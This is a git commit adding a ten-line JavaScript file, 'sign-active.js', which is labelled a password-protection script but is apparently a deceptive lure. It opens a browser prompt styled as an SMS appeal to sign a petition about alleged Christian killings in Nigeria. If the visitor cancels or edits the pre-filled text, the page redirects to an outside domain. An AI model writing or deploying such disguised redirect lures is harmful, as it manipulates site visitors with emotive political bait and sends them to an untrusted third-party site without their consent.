4e4d483385a600627ad3e82ab2a6d5d6331a373f
mfednewblog9 <newekpeitid@gmail.com>
2025-11-06 07:11:38 +0100

    Create sign-active.js

---
+++ sign-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'SIGN PETITION'
+password = prompt(
+  'SMS: HELLO! Please kindly help sign this petition for US Military to take Action Over Alleged Christian Killings in Nigeria. Please press OK to Sign now.',
+  'SIGN PETITION'
+);
+if (password != 'SIGN PETITION') {
+  location.href = 'https://fhreekift.org/nigeria.html';
+}
